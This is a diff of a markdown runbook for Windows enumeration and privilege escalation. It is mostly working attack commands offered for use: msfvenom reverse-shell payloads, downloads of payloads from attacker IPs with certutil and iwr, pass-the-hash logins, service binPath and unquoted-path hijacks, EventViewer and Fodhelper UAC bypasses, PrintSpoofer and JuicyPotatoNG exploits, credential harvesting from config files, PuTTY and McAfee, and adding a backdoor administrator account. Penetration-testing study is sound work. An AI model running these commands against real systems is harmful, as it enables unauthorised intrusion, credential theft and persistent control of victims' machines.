@@ -1,18 +1,25 @@
 # Windows Enumeration and Privilege Escalation
-<!--- Status 75% --->
+<!--- Status 90% --->
 
 ## Introduction
 
-This runbook is to help with Windows Enumeration and Privilege Escalation.  It includes a variety of techniques and tools to do so using command line or powershell.  The runbook concludes with a finalize portion that can help either keep persistance or to sanitize the host if desired.  This runbook should be utilized before the Active Directory enumeration, but many of the information gathered here will also be helpful during that phase.
+This runbook is designed to guide you through the processes of Windows enumeration and privilege escalation, providing a structured approach with practical techniques and tools. It covers both command-line and PowerShell methods, organized into four key sections:
+
+- Stabilize and Preparation: Establish a reliable shell environment and prepare for effective enumeration.
+- Enumeration: Use specific commands to gather detailed information about the host system.
+- Automated Tools: Leverage automated utilities to streamline both enumeration and privilege escalation efforts.
+- Privilege Escalation: Apply targeted techniques to elevate user privileges on the system.
+
+While this runbook should ideally be used prior to Active Directory enumeration, the information gathered here will also prove valuable during that phase.
 
 ## Table of Contents
 
 - [Windows Enumeration and Privilege Escalation](#windows-enumeration-and-privilege-escalation)
   - [Introduction](#introduction)
   - [Table of Contents](#table-of-contents)
-  - [Stabilize](#stabilize)
+  - [Stabilize and prep](#stabilize-and-prep)
     - [Useful reverse shells](#useful-reverse-shells)
-  - [Install needed tools](#install-needed-tools)
+    - [Install needed tools](#install-needed-tools)
   - [Enumeration](#enumeration)
     - [System Information](#system-information)
       - [Hostname](#hostname)
@@ -28,10 +35,10 @@ This runbook is to help with Windows Enumeration and Privilege Escalation.  It i
       - [Groups](#groups)
       - [Environment Variables](#environment-variables)
       - [Permissions](#permissions)
-      - [Tasks](#tasks)
   - [Automated Tools](#automated-tools)
     - [WinPEASx64.exe](#winpeasx64exe)
-    - [AD Checklist - Run this if you have valid AD creds](#ad-checklist---run-this-if-you-have-valid-ad-creds)
+    - [PowerUp](#powerup)
+    - [Windows Privesc check](#windows-privesc-check)
   - [Privilege Escalation](#privilege-escalation)
     - [Unquoted Service Path](#unquoted-service-path)
     - [binPath - Services \[PrivEsc\]](#binpath---services-privesc)
@@ -42,11 +49,11 @@ This runbook is to help with Windows Enumeration and Privilege Escalation.  It i
       - [EventViewer](#eventviewer)
       - [FodhelperBypass](#fodhelperbypass)
     - [Capturing configuration file credentials](#capturing-configuration-file-credentials)
-  - [Windows Enumeration Tools](#windows-enumeration-tools)
     - [Add users](#add-users)
+    - [AD Checklist - Run this if you have valid AD creds](#ad-checklist---run-this-if-you-have-valid-ad-creds)
 
 
-## Stabilize
+## Stabilize and prep
 
 - Listen to reverse shell:
 ```bash
@@ -85,15 +92,15 @@ pth-winexe -U '<username>%<lm_hash>:<nt_hash>' //<ip> cmd.exe
 
 - Via WinRM:
 
-```bash
+```sh
 evil-winrm -i <ip> -u <username> -p <password>
 evil-winrm -i <ip> -u <username> -H <nt_hash>
 ```
 
-## Install needed tools
+### Install needed tools
 <!-- Really -->
   - powerup
-    - Get-ModifiableServiceFile
+  - Get-ModifiableServiceFile
 
 ## Enumeration
 
@@ -131,8 +138,8 @@ wmic qfe list
 - Running Processes
 
 ```powershell
-- Get-Process
-- Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Get-Process
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 # NOT running as system
 tasklist /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "STATUS eq running" /V
 ```
@@ -140,8 +147,8 @@ tasklist /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "STATUS eq running" /V
 - Tasks
 
 ```cmd
-- tasklist /svc
-- schtasks
+tasklist /svc
+schtasks
 ```
 
 #### Logs & History
@@ -211,7 +218,7 @@ netstat -an | findstr LISTENING
 - Available Networks and subnets
 
 ```cmd
-- route print
+route print
 ```
 
 - DNS
@@ -236,8 +243,8 @@ arp /a
 - Network Shares
 
 ``` powershell
-- net share
-- net view
+net share
+net view
 ```
 
 - Domain Resources
@@ -312,11 +319,6 @@ Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -Fi
 findstr /SI password *.txt
 ```
 
-#### Tasks
-
-- Running
-
-- Scheduled
 
 ## Automated Tools
 
@@ -324,6 +326,12 @@ findstr /SI password *.txt
  evil-winrm
 
 ### WinPEASx64.exe
+
+```cmdd
+winPEASany.exe
+```
+
+https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  
 
 - Checklist
  What servers are running on the machine. Can we gain access to an internal HTTP server or something like that?
@@ -333,68 +341,76 @@ findstr /SI password *.txt
  Anything that winpeas highlights as an escalation factor?
  Is there e.g. a web server running as root, or MySQL/MSSQL?
 
-### AD Checklist - Run this if you have valid AD creds
+### PowerUp
 
-* Any users kerberoastable?
-* Any users ASREP-roastable?
-* Run bloodhound and visualize the AD. Anything comes to mind?
-* GMSAReadPassword?
-* LAPS? https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps
+```powershell
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
+
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1  
+
+### Windows Privesc check
+
+```cmd
+windows-privesc-check2.exe --dump -G
+```
+
+https://github.com/pentestmonkey/windows-privesc-check
 
 ## Privilege Escalation
 
 ### Unquoted Service Path
 
--> Detection 
-```
+- Detection
+
+```powershell
 wmic service get Name,State,PathName | findstr "Program"  
 sc qc <service_name>  
 \\ BINARY_PATH_NAME display Unquoted Service Paths, without ""
 powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
 ```
 
--> Exploitation - attacker
-```
+- Exploitation - attacker
+
+```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > name <name_inside_the_path>.exe  
 nc -nvlp <port>
 ```
 
--> Exploitation - windows
-```
+- Exploitation - windows
+
+```powershell
 iwr -uri <ip>/<service_eecutable_name> -Outfile <service_executable_name>
 move <name_inside_the_path>.exe <service_path>  
-```
-```
 sc stop <service_name>
 sc start <service_name>
-```
-or  
-```
+# or 
 shutdown /r
 ```
 
 ### binPath - Services [PrivEsc]
 
--> Detection
-```
+- Detection
+
+```powershell
 . .\PowerUp.ps1
 Get-ModifiableService -Verbose
-```
-or
-```
+# OR
 Get-ModifiableService -Verbose
 wmic service get Name,State,PathName | findstr "Running" | findstr "Program"  
 wmic service get Name,State,PathName | findstr "Program"  
 icacls <pathname>  
-//(F) and (i) (F)
+`//(F) and (i) (F)`
 accesschk.exe -wuvc <service_name>
-//RW Everyone  
-//  SERVICE_CHANGE_CONFIG
+`//RW Everyone ` 
+`//  SERVICE_CHANGE_CONFIG`
 sc qc <service_name>
 ```
 
--> Exploitation - Windows [PrivEsc]
-```
+- Exploitation - windows [PrivEsc]
+
+```powershell
 certutil -urlcache -f http://10.9.1.137:803/ok.exe ok.exe  
 sc config <name_ service> binPath="C:\Users\files\ok.exe" obj= LocalSystem  
 sc stop <service_name>  
@@ -406,23 +422,37 @@ https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
 
 ### SeImpersonatePrivilege
 
+- Detection - windows
+
+```powershell
+whoami /priv?
 ```
+
+- Exploitation - windows
+
+```powershell
+iwr -uri <ip>/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 PrintSpoofer64.exe -i -c cmd
 ```
+
 https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 
 ### Autorun
 
--> Detection - windows
-```
+- Detection - windows
+
+```powershell
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu ""C:\Program Files\Autorun Program"  
-\\FILE_ALL_ACCESS
+`\\FILE_ALL_ACCESS`
 ```
--> Exploitation - kali
-```
+
+- Exploitation - kali
+
+```sh
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o program.exe
 ```
-```
+
+```powershell
 iex (iwr http://<file_server_IP>/PowerView.ps1 -Outfile program.exe)
 move program.exe "C:\Program Files\Autorun Program"
 logoff
@@ -430,19 +460,22 @@ logoff
 
 ### Startup Applications
 
--> Detection - Windows
-```
+- Detection - Windows
+
+```powershell
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | findstr (F) 
 \\BUILTIN\Users:(F)
 ```
 
--> msfvenom - Attacker VM
-```
+- msfvenom - Attacker VM
+
+```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o ok.exe
 ```
 
--> Exploitation - Windows
-```
+- Exploitation - Windows
+
+```powershell
 iex (iwr http://<file_server_IP>/PowerView.ps1 -Outfile ok.exe)
 move ok.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”
 logoff
@@ -455,39 +488,46 @@ https://decoder.cloud/2017/02/03/bypassing-uac-from-a-remote-powershell-and-esca
 
 #### EventViewer
 
--> Step 1 - Kali
-```
+- Step 1 - Kali
+
+```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f exe > ok.exe
 ```
 
--> Step 2 - Win Owned  
-```
+- Step 2 - Win Owned  
+
+```powershell
 cd C:\Windows\tasks
 iwr -uri 192.168.119.139:805/shell.exe -Outfile shell.exe
 Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
 ```
 
--> Step 3 - Win Owned  
-```
+- Step 3 - Win Owned  
+
+```powershell
 iwr -uri 192.168.119.139:805/powerup.ps1 -Outfile powerup.ps1
 powershell -ep bypass
 . .\PowerUp.ps1
 Invoke-AllChecks
 ```
+
 `[+] Run a BypassUAC attack to elevate privileges to admin.`
 
--> Step 4 -Kali
-```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.139 LPORT=8445 -f exe > ok.exe
+- Step 4 -Kali
+
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=8445 -f exe > ok.exe
 ```
 
--> Step 5 - Win Owned
-```
-wget 192.168.119.139:805/Invoke-EventViewer.ps1 -O Invoke-EventViewer.ps1
+- Step 5 - Win Owned
+
+```powershell
+wget <ip>:<port>/Invoke-EventViewer.ps1 -O Invoke-EventViewer.ps1
 . .\Invoke-EventViewer.ps1
 Invoke-EventViewer cmd.exe /c "C:\Windows\tasks\shell2.exe"
 Invoke-EventViewer C:\Windows\tasks\shell2.exe
 ```
+
 https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1
 
 #### FodhelperBypass
@@ -496,30 +536,35 @@ https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass
 
 ### Capturing configuration file credentials
 
--> Powershell History  
-```
+- Powershell History  
+
+```powershell
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
--> EXploiting Saved Windows Credentials
-```
+- EXploiting Saved Windows Credentials
+
+```powershell
 cmdkey /list  
 runas /savecred /user:admin cmd.exe
 ```
 
--> IIS Configuration  
-```
+- IIS Configuration  
+
+```powershell
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString  
 type C:\inetpub\wwwroot\web.config | findstr connectionString
 ```
   
--> Retrieve Credentials from Software: PuTTY  
-```
+- Retrieve Credentials from Software: PuTTY  
+
+```powershell
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
--> Unattended Windows Installations
-```
+- Unattended Windows Installations
+
+```cmd
 C:\Unattend.xml
 C:\Windows\Panther\Unattend.xml
 C:\Windows\Panther\Unattend\Unattend.xml
@@ -527,53 +572,47 @@ C:\Windows\system32\sysprep.inf
 C:\Windows\system32\sysprep\sysprep.xml
 ```
   
--> Identify  
-```
+- Identify  
+
+```cmd
 dir /s *.db
 ```
--> McAfee Enterprise Endpoint Security - Credentials used during installation  
 
-```
+- McAfee Enterprise Endpoint Security - Credentials used during installation  
+
+```cmd
 C:\ProgramData\McAfee\Agent\DB\ma.db
 sqlitebrowser ma.db
 python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
 ```
+
 https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py
-
-## Windows Enumeration Tools
-
--> PowerUp.ps1  
-```
-. .\PowerUp.ps1
-Invoke-AllChecks
-```
-https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1  
-
--> winPEASany.exe
-```
-winPEASany.exe
-```
-https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  
-
--> windows-privesc-check2.exe  
-```
-windows-privesc-check2.exe --dump -G
-```
-https://github.com/pentestmonkey/windows-privesc-check
 
 ### Add users
 
 if `SeImpersonatePrivilege`:
 
+- Create Shell
 
+```sh
+sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
 ```
-sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o payloads/shell.exe
-iwr -uri http://192.168.45.215/JuicyPotatoNG.exe -outfile JuicyPotatoNG.exe
+
+- Exploit
+
+```powershell
+iwr -uri http://<ip>/shell.exe -outfile shell.exe
+iwr -uri http://<ip>/JuicyPotatoNG.exe -outfile JuicyPotatoNG.exe
 ./JuicyPotatoNG.exe -t * -p "./shell.exe" 
-```
 ./god.exe -cmd "net user attacker password123! /add" 
 ./god.exe -cmd "net localgroup administrators attacker /add"
+```
 
+### AD Checklist - Run this if you have valid AD creds
 
-
+* Any users kerberoastable?
+* Any users ASREP-roastable?
+* Run bloodhound and visualize the AD. Anything comes to mind?
+* GMSAReadPassword?
+* LAPS? https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps
  <!--- Last Updated July 9, 2024 --->
